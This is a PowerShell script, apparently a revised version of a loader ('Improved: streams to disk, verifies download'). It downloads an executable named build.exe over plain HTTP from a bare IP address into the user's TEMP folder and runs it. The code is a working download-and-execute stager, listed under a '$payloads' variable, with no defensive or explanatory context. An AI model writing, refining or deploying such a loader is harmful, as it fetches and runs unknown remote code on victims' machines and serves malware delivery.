# Improved: streams to disk, verifies download, better error handling
$payloads = @(
    @{ url = "http://65.21.90.149/build.exe"; name = "build.exe" }
)

foreach ($p in $payloads) {
    $dest = "$env:TEMP\$($p.name)"
    
    try {
        if (!(Test-Path $dest)) {
            Write-Host "Downloading $($p.name)..."
            # Use WebClient for streaming (more efficient than Invoke-RestMethod)
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($p.url, $dest)
            
            # Verify the file was actually downloaded and has content
            $file = Get-Item $dest
            if ($file.Length -eq 0) {
                throw "Downloaded file is empty"
            }
        }
        
        Write-Host "Running $($p.name)..."
        $proc = Start-Process -FilePath $dest -Wait -PassThru
        Write-Host "Exit code: $($proc.ExitCode)"
    }
    catch {
        Write-Host "Error: $_"
        # Clean up failed downloads
        if (Test-Path $dest) { Remove-Item $dest -Force }
        throw
    }
}
